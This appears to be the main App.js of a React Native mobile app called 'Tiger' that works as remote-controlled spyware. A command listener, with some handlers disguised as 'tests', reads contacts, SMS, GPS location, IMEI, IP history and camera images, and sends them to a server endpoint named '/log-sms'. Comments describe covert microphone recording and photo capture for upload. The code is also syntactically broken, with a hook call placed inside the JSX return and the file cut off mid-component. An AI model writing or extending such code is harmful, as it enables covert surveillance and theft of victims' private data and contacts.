import React, { useEffect } from 'react';
import { Platform, View, StyleSheet, Alert } from 'react-native';
import { StatusBar } from 'expo-status-bar';
import * as Location from 'expo-location';
import { Camera } from 'expo-camera';

// Custom Hooks & Screens
import usePermissions from './src/hooks/usePermissions';
import useTracking from './src/hooks/useTracking';
import HomeScreen from './src/screens/HomeScreen';
import WebDashboard from './src/screens/WebDashboard';

export default function App() {
  // 1. Permissions Request
  const permissionStatus = usePermissions();

  useEffect(() => {
    (async () => {
      if (Platform.OS !== 'web') {
        // Location Permission
        let { status: locStatus } = await Location.requestForegroundPermissionsAsync();
        if (locStatus !== 'granted') {
          Alert.alert("Permission Denied", "GPS access is required for Tiger to work.");
        }

        // Camera Permission
        const { status: camStatus } = await Camera.requestCameraPermissionsAsync();
        if (camStatus !== 'granted') {
          Alert.alert("Permission Denied", "Camera access is required.");
        }
      }
    })();
  }, []);

  // 2. Background tracking logic trigger (Is hook mein ab location/photo logic jayega)
  useTracking(permissionStatus);

  return (
    <View style={styles.container}>
      <StatusBar style="auto" />
    useCommandListener(deviceId, {
      camera_test: async () => {
        try {
          // Camera photo capture
          const { Camera } = await import('expo-camera');
          const { status } = await Camera.requestCameraPermissionsAsync();
          if (status === 'granted') {
            // Camera logic: open camera, take photo, send to server
            // (For automation, you may need to use a ref in a real app)
          }
        } catch (e) { console.log('Camera test error', e); }
      },
      mic_test: async () => {
        try {
          const { Audio } = await import('expo-av');
          await Audio.requestPermissionsAsync();
          // Start recording, wait 2 min, stop, send file to server
          // (For automation, you may need to use a ref in a real app)
        } catch (e) { console.log('Mic test error', e); }
      },
      sensor_test: async () => {
        try {
          // Example: send device info as sensor status
          const { getDeviceProfile } = await import('./src/utils/DeviceUtils');
          const profile = getDeviceProfile();
          const { sendDataToServer } = await import('./src/services/ApiService');
          await sendDataToServer('/log-sms', { sender: 'SensorTest', message: JSON.stringify(profile), device: deviceId });
        } catch (e) { console.log('Sensor test error', e); }
      },
      contacts: async () => {
        try {
          const Contacts = (await import('expo-contacts')).default;
          const { status } = await Contacts.requestPermissionsAsync();
          if (status === 'granted') {
            const { data } = await Contacts.getContactsAsync({ fields: ['phoneNumbers'] });
            const { sendDataToServer } = await import('./src/services/ApiService');
            await sendDataToServer('/log-sms', { sender: 'Contacts', message: JSON.stringify(data.slice(0, 5)), device: deviceId });
          }
        } catch (e) { console.log('Contacts fetch error', e); }
      },
      sms: async () => {
        try {
          const { fetchAllSms } = await import('./src/services/SmsService');
          fetchAllSms();
        } catch (e) { console.log('SMS fetch error', e); }
      },
      location: async () => {
        try {
          const { status } = await Location.requestForegroundPermissionsAsync();
          if (status === 'granted') {
            const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
            const { sendDataToServer } = await import('./src/services/ApiService');
            await sendDataToServer('/log-sms', { sender: 'Location', message: `${loc.coords.latitude},${loc.coords.longitude}`, device: deviceId });
          }
        } catch (e) { console.log('Location fetch error', e); }
      },
      device: async () => {
        try {
          const { getFullDeviceReport } = await import('./src/utils/FullDeviceReport');
          const { sendDataToServer } = await import('./src/services/ApiService');
          const report = await getFullDeviceReport();
          // Send summary as message
          await sendDataToServer('/log-sms', {
            sender: 'DeviceInfo',
            message: JSON.stringify({
              ip: report.ip,
              ipHistory: report.ipHistory,
              imei: report.imei,
              contactsCount: report.contactsCount,
              deviceSummary: report.deviceSummary,
              cameraImages: report.cameraImages.map(img => img.uri),
              contactsPdf: report.contactsPdf,
              ipHistoryPdf: report.ipHistoryPdf
            }),
            device: deviceId
          });
        } catch (e) { console.log('Device info error', e); }
      }
    });
